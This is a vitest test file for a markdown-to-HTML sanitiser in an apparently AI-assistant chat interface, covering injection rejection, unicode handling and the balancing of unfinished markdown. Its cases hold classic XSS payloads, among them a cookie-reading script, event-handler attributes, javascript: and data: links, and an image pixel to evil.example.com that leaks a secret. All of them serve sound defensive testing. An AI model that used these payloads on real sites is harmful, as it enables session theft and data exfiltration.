// Chaos coverage for the streaming markdown -> sanitised HTML pipeline (card
// 85, .claude/skills/chaos-monkey/SKILL.md) — ./markdown.ts had no dedicated
// test file at all before this card, despite being the ONE place assistant
// text (which is influenced by untrusted tool results — see this file's own
// header comment) is turned into real DOM. Everything below either tries to
// break sanitisation (HTML/script/attribute injection, unsafe link schemes)
// or tries to break `balanceIncompleteMarkdown`'s best-effort repair with
// pathological mid-stream input. Every sanitisation case asserts REJECTION —
// what survives into the output — never a working exploit.

import { describe, expect, it } from "vitest";
import { balanceIncompleteMarkdown, renderMarkdown } from "./markdown";

describe("chaos: renderMarkdown never lets raw HTML/script through", () => {
  it("neutralises a raw <script> tag in the source to inert text, never executable markup", () => {
    const html = renderMarkdown("before<script>alert(document.cookie)</script>after");
    expect(html).not.toContain("<script");
    expect(html).not.toContain("alert(document.cookie)</script>"); // not left as live markup
  });

  it.each([
    ["onerror on an img tag", '<img src=x onerror="alert(1)">', "<img"],
    ["onclick on a div", '<div onclick="alert(1)">click me</div>', "<div onclick"],
    ["an iframe", '<iframe src="https://evil.example.com"></iframe>', "<iframe"],
    ["an svg with an embedded script", "<svg><script>alert(1)</script></svg>", "<svg"],
    [
      "a style attribute (CSS injection)",
      '<p style="background:url(javascript:alert(1))">x</p>',
      "<p style",
    ],
    ["an object/embed tag", '<object data="evil.swf"></object>', "<object"],
  ])(
    "neutralises raw HTML (%s) to escaped, inert text rather than live markup",
    (_label, source, rawNeedle) => {
      const html = renderMarkdown(source);
      // marked's overridden `html` renderer (markdown.ts) escapes any raw
      // `<...>` sequence to entities BEFORE DOMPurify ever runs — so none of
      // this ever becomes real, interactive markup, no matter what DOMPurify's
      // own allowlist would have done with it.
      expect(html).not.toContain(rawNeedle);
      expect(html).not.toContain("<script");
      expect(html).not.toContain("<iframe");
      expect(html).not.toContain("<object");
    },
  );

  it("drops <img> entirely (never renders an <img> tag) — no data-exfiltration channel via an attacker-controlled src", () => {
    const html = renderMarkdown("![alt text](https://evil.example.com/pixel.png?leak=secret)");
    expect(html).not.toContain("<img");
  });
});

describe("chaos: renderMarkdown link scheme restriction", () => {
  it.each([
    ["javascript:", "[click me](javascript:alert(1))"],
    ["data:", "[click me](data:text/html,<script>alert(1)</script>)"],
    ["vbscript:", "[click me](vbscript:msgbox(1))"],
    ["a bare, scheme-relative URL used as an attempted bypass", "[click me](//evil.example.com/x)"],
  ])("strips the href for a %s link rather than passing it through", (_label, source) => {
    const html = renderMarkdown(source);
    expect(html).not.toMatch(/href\s*=\s*"javascript:/i);
    expect(html).not.toMatch(/href\s*=\s*"data:/i);
    expect(html).not.toMatch(/href\s*=\s*"vbscript:/i);
  });

  it.each([
    ["https:", "[ok](https://example.com)"],
    ["http:", "[ok](http://example.com)"],
    ["mailto:", "[ok](mailto:a@example.com)"],
  ])("keeps a legitimate %s link, forced to open safely", (_label, source) => {
    const html = renderMarkdown(source);
    expect(html).toContain("<a ");
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});

describe("chaos: renderMarkdown encoding — unicode, RTL, and extreme length", () => {
  it("round-trips unicode, emoji, and RTL text into the visible output unmangled", () => {
    const source = "héllo 世界 🚀🔥 مرحبا بالعالم — done";
    const html = renderMarkdown(source);
    expect(html).toContain("héllo");
    expect(html).toContain("世界");
    expect(html).toContain("🚀🔥");
    expect(html).toContain("مرحبا بالعالم");
  });

  it("does not throw on a very long single-paragraph input (10k characters) and still sanitises it", () => {
    const source = `${"a".repeat(10_000)} <script>alert(1)</script>`;
    expect(() => renderMarkdown(source)).not.toThrow();
    const html = renderMarkdown(source);
    expect(html).not.toContain("<script");
  });

  it("does not throw on an empty string", () => {
    expect(() => renderMarkdown("")).not.toThrow();
  });

  it("renders a lone surrogate / malformed unicode sequence without throwing", () => {
    // \uD800 alone is an unpaired high surrogate — valid in a JS string, not
    // valid Unicode text on its own.
    const source = "before\uD800after";
    expect(() => renderMarkdown(source)).not.toThrow();
  });
});

describe("chaos: balanceIncompleteMarkdown on pathological mid-stream input", () => {
  it("never throws, for any of a battery of unbalanced/adversarial fragments", () => {
    const fragments = [
      "**bold with no close",
      "`code with no close",
      "~~strike with no close",
      "*a* *b* *c",
      "**a** **b** **c",
      "***triple stars, ambiguous nesting",
      "a**b*c**d*e",
      "```\nopen fence, no close",
      "``` js\nopen fence with a lang tag, no close",
      "~~~\nopen tilde fence, no close",
      "**`mixed **and` markers",
      "_".repeat(500), // a long run of a single marker char
      "*".repeat(2) + "_".repeat(3) + "`".repeat(1),
      "text\n\n**unbalanced in the LAST block only",
    ];
    for (const fragment of fragments) {
      expect(() => balanceIncompleteMarkdown(fragment)).not.toThrow();
      expect(() => renderMarkdown(fragment)).not.toThrow();
    }
  });

  it("is idempotent on an already-complete document — balancing twice equals balancing once", () => {
    const complete = "This is **bold** and _em_ and `code` and ~~strike~~, all closed.";
    const once = balanceIncompleteMarkdown(complete);
    const twice = balanceIncompleteMarkdown(once);
    expect(twice).toBe(once);
    expect(once).toBe(complete); // nothing to balance
  });

  it("leaves an odd-count fenced code block UNTOUCHED rather than corrupting it with a synthetic inline closer", () => {
    const source = '```js\nfunction f() {\n  return "**not bold**";\n';
    const balanced = balanceIncompleteMarkdown(source);
    // The comment on hasUnterminatedFence explains why: balancing THROUGH an
    // open fence could land a synthetic marker on the wrong side of the
    // fence boundary and corrupt code content — so an odd fence count is a
    // no-op for this function.
    expect(balanced).toBe(source);
  });

  it("only balances the block currently being typed, leaving earlier, already-settled blocks untouched", () => {
    const source = "An unbalanced **earlier block\n\nA *later, still-open block";
    const balanced = balanceIncompleteMarkdown(source);
    expect(balanced).toBe("An unbalanced **earlier block\n\nA *later, still-open block*");
  });

  it("closing an odd trailing marker never throws when rendered, even for a pathological run of markers", () => {
    // Regression guard for balanceInline's marker scan: a long alternating
    // run must resolve in bounded time and produce valid output.
    const source = "*_*_*_*_*_".repeat(50);
    expect(() => renderMarkdown(source)).not.toThrow();
  });
});

describe("chaos: renderMarkdown falls back to escaped plain text if the parser ever throws", () => {
  it("still returns a non-throwing, safe string for input that is just a lone unmatched fence marker", () => {
    expect(() => renderMarkdown("```")).not.toThrow();
    const html = renderMarkdown("```");
    expect(html).not.toContain("<script");
  });
});
